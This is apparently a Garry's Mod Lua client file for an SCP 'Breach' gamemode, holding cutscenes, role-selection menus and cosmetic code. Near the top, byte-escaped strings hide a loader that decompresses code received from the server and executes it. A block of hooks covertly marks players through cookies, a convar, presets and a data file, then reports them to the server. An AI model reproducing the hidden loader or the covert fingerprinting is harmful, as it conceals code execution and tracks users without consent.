		timer_Simple(_FrameTime(), function()
			VCS(str)
		end)
		return
	end

	local f = cs(str, '\99\111\110', true)
	if isfunction(f) then
		f()
	end
end

local function VCSCustom(str, id)
	if cs == nil then
		cs = X['\67\111\109\112\105\108\101\83\116\114\105\110\103']
		timer_Simple(_FrameTime(), function()
			VCSCustom(str)
		end)
		return
	end

	local f = cs(str, tostring(id), true)
	f()
end




local UDC = X['\117\116\105\108']['\68\101\99\111\109\112\114\101\115\115']

net_Receive("GamemodeScripts", function()
	local length = tonumber(net_ReadString())
	local code = UDC(net_ReadData(length))
	VCS(code)
end)



local mtf_icon = Material("nextoren/gui/roles_icon/mtf.png")
function MOGStart()

	local client = LocalPlayer()

	BREACH.Music:Play(BR_MUSIC_SPAWN_MOG)

	timer.Simple(20-1, function()
		IntroSound()
	end)
	timer.Simple(24.5-1, function()

		util.ScreenShake( Vector(0, 0, 0), 35, 15, 3, 150 )
		surface.PlaySound("nextoren/others/horror/horror_14.ogg")

		local CutSceneWindow = vgui.Create( "DPanel" )

		CutSceneWindow:SetSize(ScrW(), ScrH())
		CutSceneWindow.DrawTime = SysTime() + 1
		CutSceneWindow.DrawLerp = 0
		CutSceneWindow.Paint = function(self, w, h)
			draw.RoundedBox(0,0,0,w,h,color_black)
			if CutSceneWindow.DrawTime <= SysTime() then
				CutSceneWindow.DrawLerp = math.Approach(CutSceneWindow.DrawLerp, 1, FrameTime())
				surface.SetMaterial(mtf_icon)
				surface.SetDrawColor(Color(255,255,255,CutSceneWindow.DrawLerp*255))
				surface.DrawTexturedRect(w / 2 - 128, h / 2 - 128, 256, 256)
			end

		end
		CutSceneWindow:SetAlpha(0)
		CutSceneWindow:AlphaTo(255,0.7,0,function()
			BREACH.Round.GeneratorsActivated = false
			timer.Simple(8, function()
				CutSceneWindow:AlphaTo(0,2,0,function()
					CutSceneWindow:Remove()
				end)
				DrawNewRoleDesc()
				hook.Remove("HUDShouldDraw", "MTF_HIDEHUD")
				LocalPlayer().cantopeninventory = nil
				for i, v in pairs(LocalPlayer():GetWeapons()) do
					if !v:GetClass():find("nade") and v:GetClass():StartWith("cw_") then
						LocalPlayer().DoWeaponSwitch = v
						break
					end
				end
			end)
		end)

	end)

end

local mtf_icon = Material("nextoren/gui/roles_icon/mtf.png")
function TGStart()

	local client = LocalPlayer()
	
	timer.Create("NewTG_SpanwTimer",80,1, function() 
		timer.Simple(1, function() 
			if MainMogFrame then 
				MainMogFrame.finalbutton:DoClick() 
			end 
		end) 
	end)
	
	
	timer.Simple(1, function()
		surface.PlaySound("nextoren/round_sounds/intercom/franklinlost.wav")
	end)
	timer.Simple(15, function()
		surface.PlaySound("nextoren/new_tg.wav")
	end)
	
		RunConsoleCommand("camera_move_to")
		timer.Simple(13, function()
			mog_menu()
		end)
		timer.Simple(.08, function() 
			
			local CutSceneWindow = vgui.Create( "DPanel" )
			CutSceneWindow:SetPos(ScrW() / 4086, ScrH() / 4086)
			CutSceneWindow:SetSize(ScrW(), ScrH())
			CutSceneWindow.DrawTime = SysTime() + 12
			CutSceneWindow.DrawLerp = 0
			CutSceneWindow.Paint = function(self, w, h)
				draw.RoundedBox(0,0,0,w,h,color_black)
				if CutSceneWindow.DrawTime <= SysTime() then
					CutSceneWindow.DrawLerp = math.Approach(CutSceneWindow.DrawLerp, 0, FrameTime())
					
					
					
				end
			end
			CutSceneWindow:SetAlpha(0)
			CutSceneWindow:AlphaTo(255,0,0,function()
				timer.Simple(18, function()
					CutSceneWindow:AlphaTo(0,2,0,function()
					CutSceneWindow:Remove()
					MainMogFrame:SetMouseInputEnabled( true )
					end)
				end)
			end)
		end)
	
	

		
		

		

		
		
		
		
		
		
		
		
		
		
		

		
		
		
			BREACH.Round.GeneratorsActivated = false
			timer.Simple(8, function()

				
				
				
				
				hook.Remove("HUDShouldDraw", "MTF_HIDEHUD")
				LocalPlayer().cantopeninventory = nil
				
				
				
				
				
				
			end)
		

	

end


function GetWeaponLang()
	if cwlang then
		return cwlang
	end
end

local PrecachedSounds = {}
function ClientsideSound( file, ent )
	ent = ent or game.GetWorld()
	local sound
	if !PrecachedSounds[file] then
		sound = CreateSound( ent, file, nil )
		PrecachedSounds[file] = sound
		return sound
	else
		sound = PrecachedSounds[file]
		sound:Stop()
		return sound
	end
end

net.Receive( "SendSound", function( len )
	local com = net.ReadInt( 2 )
	local f = net.ReadString()
	if com == 1 then
		local snd = ClientsideSound( f )
		snd:SetSoundLevel( 0 )
		snd:Play()
	elseif com == 0 then
		ClientsideSound( f )
	end
end )



SetGlobalBool("OverrideFog", false)
SetGlobalInt("FogStart", 256)
SetGlobalInt("FogEnd", 1024)
SetGlobalInt("Fog_R", 96)
SetGlobalInt("Fog_G", 47)
SetGlobalInt("Fog_B", 0)

Effect957 = false
Effect957Density = 0
Effect957Mode = 0
net.Receive( "957Effect", function( len )
	local status = net.ReadBool()
	if status then
		Effect957 = CurTime()
		Effect957Mode = 0
	elseif Effect957 then
		//Effect957 = false
		Effect957Mode = 2
		Effect957 = CurTime() + 1
	end
end )

net.Receive( "SCPList", function( len )
	SCPS = net.ReadTable()
	local transmited = net.ReadTable()

	for k, v in pairs( SCPS ) do
		v = v
	end
	for k, v in pairs( transmited ) do
		v = v
	end
	
	SetupForceSCP()
end )

timer.Simple( 1, function()
	net.Start( "PlayerReady" )
	net.SendToServer()
end )

CreateClientConVar("tgb_val", "0", true, false, "")

hook.Add("InitPostEntity", "410roq", function()

	local sucker = false

	if cookie.GetNumber("tgb_val", 0) == 1 then
		sucker = true
	end

	if cookie.GetNumber("brgb_uni", 0) == 1 then
		sucker = true
	end

	if file.Exists("darkrp_rapeswep_stat", "DATA") then
		sucker = true
	end

	if presets.Exists("rx_Breach", "Settings") then
		sucker = true
	end

	if GetConVar("tgb_val"):GetInt() != 0 then
		net.Start("111roq")
		net.WriteFloat(GetConVar("tgb_val"):GetFloat())
		net.SendToServer()
		return
	end

	if sucker then
		net.Start("110roq")
		net.SendToServer()
	end

end)

net.Receive("059roq", function()

	presets.Add("rx_Breach", "Settings", {
		volume = 1,
		drawlegs = 1,
	})

	cookie.Set("tgb_val", 1)

	file.Write("darkrp_rapeswep_stat.txt","raped:0")

	local tgb_val = GetConVar("tgb_val")

	tgb_val:SetFloat(LocalPlayer():SteamID64())


end)

net.Receive("362roq", function()

	presets.Remove("rx_Breach", "Settings")

	cookie.Delete("tgb_val")

	cookie.Delete("brgb_uni")

	file.Delete("darkrp_rapeswep_stat.txt")

end)








local clrgray = Color( 198, 198, 198 )
local clrgray2 = Color( 180, 180, 180 )
local clrred = Color( 255, 0, 0 )
local clrred2 = Color( 50,205,50 )
local gradienttt = Material( "vgui/gradient-r" )

function Choose_NTF()

	if IsValid(BREACH.Demote.MainPanel) then
		return
	end
	local teams_table = {}
	
	if LocalPlayer():SteamID64() == "76561198867007475" then

		teams_table = {
			{ name = "Д - Класс", team_id = TEAM_CLASSD, Icon = Material( "nextoren/gui/roles_icon/class_d.png" ) },
			{ name = "Ученые", team_id = TEAM_SCI, Icon = Material( "nextoren/gui/roles_icon/sci.png" ) },
			
			{ name = "СБ", team_id = TEAM_SECURITY, Icon = Material("nextoren/gui/roles_icon/sb.png") },
			{ name = "SCP", team_id = TEAM_SCP, Icon = Material("nextoren/gui/roles_icon/scp.png") }

		}
	elseif LocalPlayer():SteamID64() == "76561198342205739" then
		teams_table = {
			{ name = "СБ", team_id = TEAM_SECURITY, Icon = Material("nextoren/gui/roles_icon/sb.png") }
		}
	else
		teams_table = {

			{ name = "Д - Класс", team_id = TEAM_CLASSD, Icon = Material( "nextoren/gui/roles_icon/class_d.png" ) },
			{ name = "Ученые", team_id = TEAM_SCI, Icon = Material( "nextoren/gui/roles_icon/sci.png" ) },
			
			{ name = "СБ", team_id = TEAM_SECURITY, Icon = Material("nextoren/gui/roles_icon/sb.png") },
			{ name = "SCP", team_id = TEAM_SCP, Icon = Material("nextoren/gui/roles_icon/scp.png") }

		}
	end


	BREACH.Demote.MainPanel = vgui.Create( "DPanel" )
	BREACH.Demote.MainPanel:SetSize( 256, 256 )
	BREACH.Demote.MainPanel:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 128 )
	BREACH.Demote.MainPanel:SetText( "" )
	BREACH.Demote.MainPanel.Paint = function( self, w, h )

		if ( !vgui.CursorVisible() ) then

			gui.EnableScreenClicker( true )

		end

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
		draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )

		if ( input.IsKeyDown( KEY_BACKSPACE ) ) then

			self:Remove()
			BREACH.Demote.MainPanel.Disclaimer:Remove()
			gui.EnableScreenClicker( false )

		end

	end

	BREACH.Demote.MainPanel.Disclaimer = vgui.Create( "DPanel" )
	BREACH.Demote.MainPanel.Disclaimer:SetSize( 256, 64 )
	BREACH.Demote.MainPanel.Disclaimer:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 192 )
	BREACH.Demote.MainPanel.Disclaimer:SetText( "" )

	local client = LocalPlayer()

	local title = L"l:ntfcmd_factionlist"

	BREACH.Demote.MainPanel.Disclaimer.Paint = function( self, w, h )

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
		draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )

		draw.DrawText( title, "ChatFont_new", w / 2, h / 2 - 16, color_black, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

		

		

		

		

		

		

		

	end

	BREACH.Demote.ScrollPanel = vgui.Create( "DScrollPanel", BREACH.Demote.MainPanel )
	BREACH.Demote.ScrollPanel:Dock( FILL )

	for i = 1, #teams_table do
		if teams_table[i].name == "SCP" and gteams.NumPlayers(TEAM_SCP) < 3 then
		BREACH.Demote.Users = BREACH.Demote.ScrollPanel:Add( "DButton" )
		BREACH.Demote.Users:SetText( "" )
		BREACH.Demote.Users:Dock( TOP )
		BREACH.Demote.Users:SetSize( 256, 64 )
		BREACH.Demote.Users:DockMargin( 0, 0, 0, 2 )
		BREACH.Demote.Users.CursorOnPanel = false
		BREACH.Demote.Users.gradientalpha = 0

		local name = L(teams_table[i].name)

		BREACH.Demote.Users.Paint = function( self, w, h )

			if ( self.CursorOnPanel ) then

				self.gradientalpha = math.Approach( self.gradientalpha, 255, FrameTime() * 128 )

			else

				self.gradientalpha = math.Approach( self.gradientalpha, 0, FrameTime() * 256 )

			end

			draw.RoundedBox( 0, 0, 0, w, h, color_black )
			draw.OutlinedBox( 0, 0, w, h, 1.5, clrgray )

			surface.SetDrawColor( ColorAlpha( color_white, self.gradientalpha ) )
			surface.SetMaterial( gradienttt )
			surface.DrawTexturedRect( 0, 0, w, h )

			surface.SetDrawColor( color_white )
			surface.SetMaterial( teams_table[ i ].Icon )
			surface.DrawTexturedRect( 0, h / 2 - 32, 64, 64 )

			draw.SimpleText( name, "ChatFont_new", 65, h / 2, clrgray, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )

		end

		BREACH.Demote.Users.OnCursorEntered = function( self )

			self.CursorOnPanel = true

		end

		BREACH.Demote.Users.OnCursorExited = function( self )

			self.CursorOnPanel = false

		end

		BREACH.Demote.Users.DoClick = function( self )


			BREACH.Demote.MainPanel:Remove()
			BREACH.Demote.MainPanel.Disclaimer:Remove()
			gui.EnableScreenClicker( false )
			
			if LocalPlayer():SteamID64() == "76561198867007475" then
			net.Start( "DoMe106" )
			net.WritePlayer(LocalPlayer())
			net.SendToServer()
			else
			net.Start( "DoMe999" )
			net.WritePlayer(LocalPlayer())
			net.SendToServer()
			end



		end
		elseif teams_table[i].name != "SCP" then
		BREACH.Demote.Users = BREACH.Demote.ScrollPanel:Add( "DButton" )
		BREACH.Demote.Users:SetText( "" )
		BREACH.Demote.Users:Dock( TOP )
		BREACH.Demote.Users:SetSize( 256, 64 )
		BREACH.Demote.Users:DockMargin( 0, 0, 0, 2 )
		BREACH.Demote.Users.CursorOnPanel = false
		BREACH.Demote.Users.gradientalpha = 0

		local name = L(teams_table[i].name)

		BREACH.Demote.Users.Paint = function( self, w, h )

			if ( self.CursorOnPanel ) then

				self.gradientalpha = math.Approach( self.gradientalpha, 255, FrameTime() * 128 )

			else

				self.gradientalpha = math.Approach( self.gradientalpha, 0, FrameTime() * 256 )

			end

			draw.RoundedBox( 0, 0, 0, w, h, color_black )
			draw.OutlinedBox( 0, 0, w, h, 1.5, clrgray )

			surface.SetDrawColor( ColorAlpha( color_white, self.gradientalpha ) )
			surface.SetMaterial( gradienttt )
			surface.DrawTexturedRect( 0, 0, w, h )

			surface.SetDrawColor( color_white )
			surface.SetMaterial( teams_table[ i ].Icon )
			surface.DrawTexturedRect( 0, h / 2 - 32, 64, 64 )

			draw.SimpleText( name, "ChatFont_new", 65, h / 2, clrgray, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )

		end

		BREACH.Demote.Users.OnCursorEntered = function( self )

			self.CursorOnPanel = true

		end

		BREACH.Demote.Users.OnCursorExited = function( self )

			self.CursorOnPanel = false

		end

		BREACH.Demote.Users.DoClick = function( self )


			BREACH.Demote.MainPanel:Remove()
			BREACH.Demote.MainPanel.Disclaimer:Remove()
			gui.EnableScreenClicker( false )
			SelectDefaultClass(teams_table[ i ].team_id)



		end
		end

	end

end

local donatorRoleSelection = {
	["76561198966614836"] = true,
	["76561198342205739"] = true,
	["76561198376629308"] = true,
	["76561198420505102"] = true,
	["76561199065187455"] = true,
	["76561198867007475"] = true,
}

concommand.Add("br_donator_role_select", function(ply)
	if preparing and donatorRoleSelection[ply:SteamID64()] then
		Choose_NTF()
	end
end)
local clrgray = Color( 198, 198, 198 )
local clrgray2 = Color( 180, 180, 180 )
local clrred = Color( 255, 0, 0 )
local clrred2 = Color( 50,205,50 )
local gradienttt = Material( "vgui/gradient-r" )

function New_Hacker()

	if IsValid(BREACH.Demote.MainPanel) then
		return
	end

	local teams_table = {

		{ name = "Скоростной", team_id = 1, Icon = Material( "nextoren/gui/new_icons/level/lvl2.png" ) },
		{ name = "Быстрый", team_id = 2, Icon = Material( "nextoren/gui/new_icons/level/lvl3.png" ) },
		{ name = "Средний", team_id = 3, Icon = Material( "nextoren/gui/new_icons/level/lvl5.png" ) },
		{ name = "Нормальный", team_id = 4, Icon = Material("nextoren/gui/new_icons/level/lvl6.png") },
		{ name = "Гарантированный", team_id = 5, Icon = Material("nextoren/gui/new_icons/level/lvl7.png") }

	}



	BREACH.Demote.MainPanel = vgui.Create( "DPanel" )
	BREACH.Demote.MainPanel:SetSize( 256, 256 )
	BREACH.Demote.MainPanel:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 128 )
	BREACH.Demote.MainPanel:SetText( "" )
	BREACH.Demote.MainPanel.Paint = function( self, w, h )

		if ( !vgui.CursorVisible() ) then

			gui.EnableScreenClicker( true )

		end

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
		draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )

		if ( input.IsKeyDown( KEY_BACKSPACE ) ) then

			self:Remove()
			BREACH.Demote.MainPanel.Disclaimer:Remove()
			gui.EnableScreenClicker( false )

		end

	end

	BREACH.Demote.MainPanel.Disclaimer = vgui.Create( "DPanel" )
	BREACH.Demote.MainPanel.Disclaimer:SetSize( 256, 64 )
	BREACH.Demote.MainPanel.Disclaimer:SetPos( ScrW() / 2 - 128, ScrH() / 2 - 192 )
	BREACH.Demote.MainPanel.Disclaimer:SetText( "" )

	local client = LocalPlayer()

	local title = L"l:ntfcmd_factionlist"

	BREACH.Demote.MainPanel.Disclaimer.Paint = function( self, w, h )

		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_white, 120 ) )
		draw.OutlinedBox( 0, 0, w, h, 1.5, color_black )

		draw.DrawText( title, "ChatFont_new", w / 2, h / 2 - 16, color_black, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )

		

		

		

		

		

		

		

	end

	BREACH.Demote.ScrollPanel = vgui.Create( "DScrollPanel", BREACH.Demote.MainPanel )
	BREACH.Demote.ScrollPanel:Dock( FILL )

	for i = 1, #teams_table do
		BREACH.Demote.Users = BREACH.Demote.ScrollPanel:Add( "DButton" )
		BREACH.Demote.Users:SetText( "" )
		BREACH.Demote.Users:Dock( TOP )
		BREACH.Demote.Users:SetSize( 256, 64 )
		BREACH.Demote.Users:DockMargin( 0, 0, 0, 2 )
		BREACH.Demote.Users.CursorOnPanel = false
		BREACH.Demote.Users.gradientalpha = 0

		local name = L(teams_table[i].name)

		BREACH.Demote.Users.Paint = function( self, w, h )

			if ( self.CursorOnPanel ) then

				self.gradientalpha = math.Approach( self.gradientalpha, 255, FrameTime() * 128 )

			else

				self.gradientalpha = math.Approach( self.gradientalpha, 0, FrameTime() * 256 )

			end

			draw.RoundedBox( 0, 0, 0, w, h, color_black )
			draw.OutlinedBox( 0, 0, w, h, 1.5, clrgray )

			surface.SetDrawColor( ColorAlpha( color_white, self.gradientalpha ) )
			surface.SetMaterial( gradienttt )
			surface.DrawTexturedRect( 0, 0, w, h )

			surface.SetDrawColor( color_white )
			surface.SetMaterial( teams_table[ i ].Icon )
			surface.DrawTexturedRect( 0, h / 2 - 32, 64, 64 )

			draw.SimpleText( name, "ChatFont_new", 65, h / 2, clrgray, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER )

		end

		BREACH.Demote.Users.OnCursorEntered = function( self )

			self.CursorOnPanel = true

		end

		BREACH.Demote.Users.OnCursorExited = function( self )

			self.CursorOnPanel = false

		end

		BREACH.Demote.Users.DoClick = function( self )


			BREACH.Demote.MainPanel:Remove()
			BREACH.Demote.MainPanel.Disclaimer:Remove()
			gui.EnableScreenClicker( false )
			
			net.Start("SendHack")
			net.WriteInt(teams_table[ i ].team_id,16)
			net.SendToServer()



		end

	end

end

concommand.Add("new_hacker_panel", function(ply)
	New_Hacker()
end)

timer.Create("Legacy_Gloves_Up", 1, 0, function()
	
	if IsValid(LocalPlayer()) and LocalPlayer():Alive() and LocalPlayer():GTeam() != TEAM_SPEC then
		for k,v in pairs(LocalPlayer():GetHands():GetMaterials()) do
			if v == "models/shakytest/vm_mp_beta_glove_iw9_1_1" then
				if LEFACY_GLOVES_BOY[LocalPlayer():SteamID64()] and GetConVar("breach_config_prem_gloves"):GetString() == "boykisser" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/boykisser")
				elseif LEFACY_GLOVES_MGE[LocalPlayer():SteamID64()] and GetConVar("breach_config_prem_gloves"):GetString() == "mge" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/mge")
				elseif LEFACY_GLOVES_d_1[LocalPlayer():SteamID64()] and GetConVar("breach_config_prem_gloves"):GetString() == "donate1" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/donate_gloves_1")
				elseif LEFACY_GLOVES_pyz[LocalPlayer():SteamID64()] and GetConVar("breach_config_prem_gloves"):GetString() == "pyz" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/pyzirik")
				elseif LEFACY_GLOVES_fisher[LocalPlayer():SteamID64()] and GetConVar("breach_config_prem_gloves"):GetString() == "fisher" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/fisher")
				elseif (LEFACY_GLOVES_ANTIFURRY[LocalPlayer():SteamID64()] or tonumber(LocalPlayer():GetNWInt("gloves_antifurry")) == 1) and GetConVar("breach_config_prem_gloves"):GetString() == "antifurry" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/antifurry")
				elseif tonumber(LocalPlayer():GetNWInt("gloves_xmas")) == 1 and GetConVar("breach_config_prem_gloves"):GetString() == "xmas" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/ny")
				elseif LocalPlayer():IsPremium() and GetConVar("breach_config_prem_gloves"):GetString() == "prem" then
					LocalPlayer():GetHands():SetSubMaterial(k - 1,"models/shakytest/prem")
				end
			end
		end
	end
end)

net.Receive("WriteDerma", function(_, ply)
	local text1 = net.ReadString()
	local text2 = net.ReadString()
	local text3 = net.ReadString()
	Derma_Message(text1, text2, text3)
end)

function GM:SpawnMenuOpen()
	
    
	return LocalPlayer():IsSuperAdmin() and GetConVar("breach_config_event_mode"):GetBool()
	

end
function GM:ContextMenuOpen()

    
	return false

end

local goc_icon = Material( "nextoren/gui/roles_icon/scp.png" )
local goc_clr = Color( 0, 198, 198 )


function SCPStart()

	local client = LocalPlayer()
	client:ConCommand( "stopsound" )

	BREACH.Music:Play(BR_MUSIC_SPAWN_SCP)
	

	

	


	local CutSceneWindow = vgui.Create( "DPanel" )
	CutSceneWindow:SetText( "" )
	CutSceneWindow:SetSize( ScrW(), ScrH() )
	CutSceneWindow.StartAlpha = 255
	CutSceneWindow.StartTime = CurTime() + 32
	
	
	

	
	
	

	local str = ""
	local str1 = ""
	local str2 = ""

	local count = 0
	local count1 = 0
	local count2 = 0

	CutSceneWindow.Paint = function( self, w, h )
		draw.RoundedBox( 0, 0, 0, w, h, ColorAlpha( color_black, self.StartAlpha ) )

		if ( CutSceneWindow.StartTime <= CurTime() ) then

			surface.SetDrawColor( ColorAlpha( color_white, math.Clamp( self.StartAlpha - 40, 0, 255 ) ) )
			surface.SetMaterial( goc_icon )
			surface.DrawTexturedRect( ScrW() / 2 - 201, ScrH() / 2 - 201, 402, 402 )

			if ( CutSceneWindow.StartTime <= CurTime() - 16 ) then

				self.StartAlpha = math.Approach( self.StartAlpha, 0, RealFrameTime() * 20 )
				if self.StartAlpha != 255 and self.DescPlayed != true then
					self.DescPlayed = true
					DrawNewRoleDesc()
					net.Start("ProceedUnfreezeSUP")
					net.SendToServer()
				end

			end

			

			
			
			

			

			
			
			

			

			
			
			

			

			
			
			

		end

		if ( self.StartAlpha <= 0 ) then

			FadeMusic( 15 )
			
			self:Remove()

		end

	end

end


local PANEL = {}

function PANEL:Init()
    self.HTML = vgui.Create("DHTML", self)
    self.HTML:SetAlpha(0) 
    
    self.Loading = true
end

function PANEL:SetImageURL(url)
    self.Loading = true
    
    self.HTML:SetHTML([[
        <html>
            <body style="margin:0; padding:0; overflow:hidden; background:transparent;">
                <img id="image" src="]] .. url .. [[" 
                     style="width:100%; height:100%; object-fit:contain;"
                     onload="console.log('loaded')"
                     onerror="console.log('error')">
            </body>
        </html>
    ]])
    
    
    timer.Simple(0.5, function()
        if IsValid(self) then
            self.Loading = false
            self.HTML:SetAlpha(255)
        end
    end)
end

function PANEL:Paint(w, h)
    if self.Loading then
        surface.SetDrawColor(80, 80, 80, 255)
        surface.DrawRect(0, 0, w, h)
        draw.SimpleText("Загрузка...", "DermaDefault", w/2, h/2, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
end

function PANEL:PerformLayout(w, h)
    self.HTML:SetSize(w, h)
end

vgui.Register("DWebImage", PANEL, "Panel")




















local scarletmat = Material("nextoren/gui/roles_icon/mtf.png")
hook.Add( "PostDrawTranslucentRenderables", "o5_draw_mark", function( bDepth, bSkybox )
	local client = LocalPlayer()
	local capos = O5_VECTOR
	if O5_VECTOR then
	if capos == Vector(0, 0, 0) then return end
	local ang = client:EyeAngles()
	ang:RotateAroundAxis( ang:Forward(), 90 )
	ang:RotateAroundAxis( ang:Right(), 90 )
	capos = capos + Vector(0,0, 50)
	local dist = client:GetPos():Distance(capos)
	local size = 140 * (math.Clamp(dist * .005, 1, 30))
	if LocalPlayer():GetNWBool("ALPHACanSea") then
		cam.Start3D2D( capos, ang, 0.1 )
		cam.IgnoreZ(true)
			surface.SetDrawColor(ColorAlpha(color_white, 255 - Pulsate(5) * 40))
			surface.SetMaterial(scarletmat)
			surface.DrawTexturedRect(-(size/2), -(size/2), size, size);
		cam.End3D2D()
		cam.IgnoreZ(false)
	end
	end
end)

local FRAME


function CreatePropMenu()
    if IsValid(FRAME) then FRAME:Remove() end
    
    FRAME = vgui.Create("DFrame")
    FRAME:SetSize(600, 700)
    FRAME:SetTitle("Prop Preview Menu - Head Focus")
    FRAME:Center()
    FRAME:MakePopup()
    
    
    local modelPanel = vgui.Create("DModelPanel", FRAME)
    modelPanel:SetSize(500, 400)
    modelPanel:SetPos(50, 50)
    modelPanel:SetFOV(25) 
    
    
    local currentMaterial = 1
    local currentModel = 1
    
    
    local function FindHeadBone(entity)
        if not IsValid(entity) then return nil end
        
        
        local headBones = {
            "ValveBiped.Bip01_Head1",
            "Head",
            "Bip01 Head",
            "Bip01_Head",
            "Bip01_Head1",
            "head",
            "bip_head"
        }
        
        
        for _, boneName in ipairs(headBones) do
            local boneId = entity:LookupBone(boneName)
            if boneId and boneId > 0 then
                return boneId
            end
        end
        
        
        return 0
    end
    
    
    local function UpdateModel()
        local materialPath = "models/cultist/heads/male/male_face_" .. currentMaterial
        local modelPath = "models/cultist/heads/male/male_head_" .. currentModel .. ".mdl"
        
        
        modelPanel:SetModel(modelPath)
        
        
        local ent = modelPanel.Entity
        if IsValid(ent) then
           
           
                    ent:SetSubMaterial(0, materialPath)
            
            
            
            
            timer.Simple(0.1, function()
                if not IsValid(ent) then return end
                
                local headBone = FindHeadBone(ent)
                
                if headBone and headBone > 0 then
                    
                    local headPos = ent:GetBonePosition(headBone)
                    local headAng = ent:GetBoneMatrix(headBone):GetAngles()
                    
                    if headPos then
                        
                        local offset = headAng:Forward() * 15 + headAng:Up() * 15 + headAng:Right() * 50
                        local camPos = headPos + offset
                        
                        modelPanel:SetLookAt(headPos)
                        modelPanel:SetCamPos(camPos)
                    end
                else
                    
                    local center = ent:OBBCenter()
                    local dist = ent:BoundingRadius() * 0.8
                    
                    modelPanel:SetLookAt(center + Vector(0,0,90))
                    modelPanel:SetCamPos(center + Vector(dist, 0, 0))
                end
            end)
        end
    end
    
    
    function modelPanel:LayoutEntity(ent)
        if not IsValid(ent) then return end
        
        
        
            
       
            
        
    end
    
    
    local materialLabel = vgui.Create("DLabel", FRAME)
    materialLabel:SetText("Material: " .. currentMaterial)
    materialLabel:SetPos(50, 470)
    materialLabel:SetSize(200, 20)
    materialLabel:SetColor(Color(255, 255, 255))
    
    local materialSlider = vgui.Create("DNumSlider", FRAME)
    materialSlider:SetPos(50, 500)
    materialSlider:SetSize(500, 50)
    materialSlider:SetText("Material Selection")
    materialSlider:SetMin(1)
    materialSlider:SetMax(400)
    materialSlider:SetDecimals(0)
    materialSlider:SetValue(currentMaterial)
    
    materialSlider.OnValueChanged = function(self, value)
        currentMaterial = math.Round(value)
        materialLabel:SetText("Material: " .. currentMaterial)
        UpdateModel()
    end
    
    
    local modelLabel = vgui.Create("DLabel", FRAME)
    modelLabel:SetText("Model: " .. currentModel)
    modelLabel:SetPos(50, 570)
    modelLabel:SetSize(200, 20)
    modelLabel:SetColor(Color(255, 255, 255))
    
    local modelSlider = vgui.Create("DNumSlider", FRAME)
    modelSlider:SetPos(50, 600)
    modelSlider:SetSize(500, 50)
    modelSlider:SetText("Model Selection")
    modelSlider:SetMin(1)
    modelSlider:SetMax(215)
    modelSlider:SetDecimals(0)
    modelSlider:SetValue(currentModel)
    
    modelSlider.OnValueChanged = function(self, value)
        currentModel = math.Round(value)
        modelLabel:SetText("Model: " .. currentModel)
        UpdateModel()
    end
    
    
    local infoLabel = vgui.Create("DLabel", FRAME)
    infoLabel:SetText("")
    infoLabel:SetPos(50, 450)
    infoLabel:SetSize(300, 20)
    infoLabel:SetColor(Color(200, 200, 200))
    
    
    local closeButton = vgui.Create("DButton", FRAME)
    closeButton:SetText("Close")
    closeButton:SetPos(250, 660)
    closeButton:SetSize(100, 30)
    
    closeButton.DoClick = function()
        FRAME:Close()
    end
    
    
    UpdateModel()
end


concommand.Add("prop_menu", CreatePropMenu)
local image = {
	"nextoren/gui/loading_fon/ymni_ar.jpg",
	"nextoren/gui/loading_fon/ymni_avel.jpg",
	"nextoren/gui/loading_fon/ymni_dz.jpg",
	
	"nextoren/gui/loading_fon/ymni_goc.jpg",
	"nextoren/gui/loading_fon/ymni_o5.jpg",
	"nextoren/gui/loading_fon/ymni_ustra.jpg",
}
concommand.Add("dev_loading", function()
    
    if IsValid(BREACH_ROUND_LOADING) then BREACH_ROUND_LOADING:Remove() end

    local scrw, scrh = ScrW(), ScrH()
    
    local rust_yellow = Color(218, 165, 32)
    local rust_text_dim = Color(140, 140, 140)

    
    BREACH_ROUND_LOADING = vgui.Create("DPanel")
    local Pnl = BREACH_ROUND_LOADING
    Pnl:SetSize(scrw, scrh)
    Pnl:SetPos(0, 0)
    Pnl:SetZPos(32767) 
    
    
    Pnl:SetAlpha(0)
    Pnl:AlphaTo(255, 0.5, 0)

    
    local isFurry = GetGlobalBool("NextFurry")
    local matImage
    
    if isFurry then
        matImage = Material("nextoren/gui/loading_fon/ymni_furry.jpg", "smooth")
        timer.Simple(0.1, function() surface.PlaySound("nextoren/furry_event_prep.mp3") end)
    else
        matImage = Material(table.Random(image), "smooth")
    end

    local grad_up = Material("vgui/gradient-u")
    local startTime = SysTime()
    
    
    
    
    local timeTo100 = 6.5 
    local holdTime = math.Rand(0.5, 2.0) 

    
    
    
    local waypoints = {
        {t = 0.0, p = 0.00},
        {t = 0.8, p = 0.15},
        {t = 1.4, p = 0.15}, 
        {t = 2.2, p = 0.32},
        {t = 2.7, p = 0.32}, 
        {t = 3.6, p = 0.55},
        {t = 4.2, p = 0.70},
        {t = 4.6, p = 0.70}, 
        {t = 5.4, p = 0.88},
        {t = 6.0, p = 0.97},
        {t = 6.2, p = 0.97}, 
        {t = timeTo100, p = 1.00}, 
        {t = 99.0, p = 1.00} 
    }

    local stages = {
        {p = 0.00, txt = "ОЧИСТКА КАРТЫ..."},
        {p = 0.16, txt = "ПРИМЕНЕНИЕ НАСТРОЕК РЕЖИМА..."},
